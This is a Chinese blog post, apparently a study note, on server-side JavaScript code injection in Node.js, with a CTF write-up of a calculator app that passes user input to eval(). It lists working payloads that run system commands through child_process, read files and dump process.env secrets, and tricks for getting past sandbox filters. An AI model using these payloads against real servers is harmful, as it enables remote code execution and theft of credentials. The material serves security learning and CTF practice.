---
title: "SSJI服务器端JavaScript代码注入学习与实践"
description: "深入学习服务器端JavaScript代码注入漏洞的原理、利用技巧、沙箱绕过方法以及实际CTF案例分析。"
date: "2025-09-05"
tags:
  - "SSJI"
  - "JavaScript"
  - "代码注入"
  - "安全研究"
  - "CTF"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "ssji-learning"    # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# SSJI
![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1757066293580-e10e422d-c185-4a09-a939-f08b87bb6ea7.png)

## SSJI-konw
Server-side JavaScript code injection 服务器端 JavaScript 代码注入

portswigger描述如下（[https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection）](https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection）)

_Server-side code injection vulnerabilities arise when an application incorporates user-controllable data into a string that is dynamically evaluated by a code interpreter. If the user data is not strictly validated, an attacker can use crafted input to modify the code to be executed, and inject arbitrary code that will be executed by the server._  
_服务器端代码注入漏洞产生于应用程序将用户可控数据整合到由代码解释器动态执行的字符串中。如果用户数据未经严格验证，攻击者可利用精心构造的输入来修改待执行代码，并注入任意代码由服务器执行。_

_Server-side code injection vulnerabilities are usually very serious and lead to complete compromise of the application's data and functionality, and often of the server that is hosting the application. It may also be possible to use the server as a platform for further attacks against other systems._  
_服务器端代码注入漏洞通常非常严重，会导致应用程序的数据和功能完全被破坏，并且常常会影响到托管该应用程序的服务器。此外，还可能利用该服务器作为平台，对其他系统发起进一步攻击。_



 **JavaScript 里能动态执行代码的函数**，主要有四个

+ eval

把字符串当脚本执行

```javascript
eval("2 + 3") // 5
eval("console.log('hello')") // 输出 hello
```

+ setTimeout()

延迟执行

```javascript
// 推荐：函数写法
setTimeout(() => console.log("hi"), 1000)

// 不推荐：字符串写法（等于 eval）
setTimeout("console.log('hi')", 1000)
```



+ Function

`Function` 构造函数创建的代码运行在 **全局作用域**，不像 `eval` 那样能访问当前作用域的局部变量。

```javascript
let f = Function('a','b','return a+b');
console.log(f(1,2));
```



+ setInterval()

周期性执行

```plain
setInterval(() => console.log("tick"), 2000) // 每 2 秒执行一次
```





## 恶意payload以及利用
大概总览如下

**信息泄露**：

主要是利用process量去获取信息

`process.env`、`process.cwd()`、`process.versions`、`__dirname`

**文件读取**：`fs.readFileSync('/flag','utf-8')`

**命令执行**：`child_process.execSync('cat /flag').toString()`

**网络外带**：`http.get/axios/fetch`（题中可能屏蔽或无网络）





### 执行命令函数
Node.js 里直接能调用系统命令的主要函数都在 `child_process` 模块里

```javascript
require('child_process').exec
require('child_process').execSync
require('child_process').spawn
require('child_process').spawnSync
```

这四个主要区别表，如下AI总结

| 函数 | 是否同步 | 是否走 shell | 返回方式 | 适合场景 |
| --- | --- | --- | --- | --- |
| `exec` | 异步 | ✅ | 回调参数 `stdout` / `stderr` | 简单命令，输出较小 |
| `execSync` | 同步 | ✅ | 返回字符串 | 一步拿结果，快速测试 |
| `spawn` | 异步 | ❌（默认） | 返回 ChildProcess 对象 | 流式处理大输出 |
| `spawnSync` | 同步 | ❌（默认） | 返回结果对象 | 阻塞执行，输出可控 |


我们操作过程中，主要就用`execSync`,一步就拿到内容

具体例子

```javascript
require('child_process').exec('whoami').toString()
--->
Res[object Object]

require('child_process').execSync('whoami').toString()
-->
Resbpple\bx336
```







### 获取上下文
我们必须要去获得全局对象,

> 什么是全局对象，在浏览器或者nodejs 里面，都会有一个“顶层对象”，里面挂着运行环境的所有核心 API
>
> 在 浏览器里：
>
> + 叫 `window` 或 `globalThis`
> + 包含：`document`、`XMLHttpRequest`、`fetch` 等等
>
> 在 Node.js 里：
>
> + 叫 `global` 或 `globalThis`
> + 包含：`process`、`Buffer`、`setTimeout`、`require`（某些作用域下可见）
>

主要就这几个

+ `this`
+ `globalThis`
+ `(Function("return this"))()`
+ `(Function("return process"))()` ← Node 里常见

这里还有一些trick去帮助我们扩展一下

#### 利用Function构造函数
```javascript
(Function("return this"))()
(Function("return globalThis"))()
(Function("return process"))()   // Node 里最实用
```

#### 构造器链子
利用对象的 `constructor`，最终能拿到 `Function`

```javascript
({}).constructor      // Function
({}).constructor("return this")()
([]).constructor("return this")()
true.constructor("return this")()
```

#### 原型链
```javascript
({}).__proto__.constructor("return this")()
[].__proto__.constructor("return this")()
```



一些最后的效果就是构造如下

这里举两个路线

```javascript
// mainModule 路线
({}).constructor("return process")()
  .mainModule.require('fs')
  .readFileSync('/flag','utf-8')

// createRequire 路线
(() => {
  const Module = ({}).constructor("return require('module')")();
  const req = Module.createRequire(process.cwd() + '/');
  return req('fs').readFileSync('/flag','utf-8');
})()

```

还有一些别的功能的

```javascript
JSON.stringify(process.env, null, 2)
--->
({}).constructor("return process")()
  .mainModule.require('util')
  .inspect(process.env, { depth: null })
```











### require替代
我们常使用require引入模块执行我们需要的功能

```javascript
require('child_process').exec('calc');
```

> `process` 是一个全局对象，存储着运行环境信息：平台、pid、cwd、env 等
>

`process.mainModule.require` 等同于 `require()`



或者

```javascript
const Module = (Function("return require('module')"))();
Module.createRequire(process.cwd() + "/")('fs')
```

`Function("return require('module')")`  后面`()`直接立即执行，返回`module`原生模块对象

后面一行具体逻辑是

`Module.createRequire(process.cwd() + "/")`

> `Module.createRequire` 是 Node.js v12+ 提供的 API
>

可以以指定路径为根创建一个新的 require 函数。  
`process.cwd()` 返回当前工作目录，`+ "/"` 保证是目录路径（不是文件路径）。

这样创建出来的新 require 可以像在项目根目录一样加载模块，不会受当前文件的 __dirname 影响





### 字符对象现身
我们经常遇到的情况是,举个例子

```javascript
process.env
```

就是只显示`[object Object]`这些属性

![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905163237299.png)

我们想要的是具体内容而不是属性



1. 直接转成json

```javascript
JSON.stringify(process.env)
```

![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905162615581.png)

有些时候比较多，可以换行显示

```javascript
JSON.stringify(process.env,null,2)
```

![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905162750321.png)



2. 使用`util.inspect`美化

`util.inspect` 是 Node.js 内置 `util` 模块里的一个函数，它的作用就是 **把任意对象转成字符串**，而且输出更详细，比默认的 `.toString()` 好得多。

```javascript
process.mainModule.require("util").inspect(process.env,{depth:null})
```

下面同理

```javascript
(Function("return process"))().mainModule.require('util').inspect(process.env,{depth:null})
```



3. 变成「env 文件」风格的纯文本

这个

```javascript
Object.entries(process.env).map(([k,v])=>k '=' v).join('')
```



4. `console.dir`

跟`console.log`有点像

```javascript
console.dir(process.env, {depth:null})
```

![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905164424716.png)





5. `require('util').format()`

跟刚刚那个`util.inspect` 相似,就是没有缩进，类似 `printf`，可以把对象格式化

```plain
process.mainModule.require('util').format(process.env)
```

![](C:\Users\bx336\AppData\Roaming\Typora\typora-user-images\image-20250905164650100.png)



6. Buffer

```javascript
Buffer.from(JSON.stringify(process.env)).toString()
```

但这个有点画蛇添足了

本质还是`JSON.stringify(process.env)` 转回来又转回去





### 沙箱绕过
对于一些沙箱绕过的思路如下，跟其他的差不多

+ **关键字分拆/拼接**：`"pro"+"cess"`、``${'pro'}${'cess'}``、`globalThis['pro'+'cess']`

```javascript
({}).constructor("return this['pro'+'cess']['main'+'Module']['requ'+'ire']('fs')")
```



+ **编码**：`\x70\x72\x6f\x63\x65\x73\x73`（`process`）
+ **调用链转进**：不用 `require`，走 `Module.createRequire` / `module.constructor._load`

这里深入说一下，等价关系

采用构造器，`module.constructor` 指向的是 `Module` 类。

```javascript
require === module.constructor._load
```

这里还有一个关系图

```javascript
require()
   ↓
Module._load()
   ↓
new Module()
   ↓
module._compile()
   ↓
module.exports
```

所以一个效果就是

```javascript
module.constructor   // => Module 类
module.constructor._load   // => require 的底层实现
```



+ **无 **`mainModule`：新版本 Node 可直接 `require('module')`
+ **禁 **`require`** 标识符**：从 `process` 拿 `binding` 或“缓存”对象（题目相关、难度较高）
+ **模板引擎特性**：EJS `<%=` 任意表达式；Pug `-` 行内 JS；Handlebars 需找 helper/原型污染链
+ **表达式求值器**：如果只允许数字/运算符，试探是否能逃出（如逗号运算符、数组/对象字面量、函数字面量、三目、模板字符串）





## 具体案例
### **Breathtaking View  令人惊叹的景色**
> Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!  
查看我的新网站，展示令人惊叹的景色——希望没有人能“操控”它！
>

一道 SSJI 的题目



一个计算器界面

代码审计

```javascript
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
  return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
  let { formula } = req.body;

  if (formula) {
    result = Calculator.calculate(formula);
    return res.send(response(result));
  }

  return res.send(response('Missing parameters'));
})

module.exports = router;

// ocd
```

看一下这个calculate 函数

```javascript
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}


// ocd
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994516843-e66d27d4-3c6b-46a2-bcb0-e67e5fc2c7d4.png)

可以执行 js 代码

构造如下，列出当前目录

```html
process.platform

require('child_process').execSync('ls').toString()
```

尝试获取 flag

```javascript
require('child_process').execSync('cat /flag.txt').toString()
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994999793-95b26fcb-b440-4ec3-a3f7-ec6105aac467.png)

得到 flag

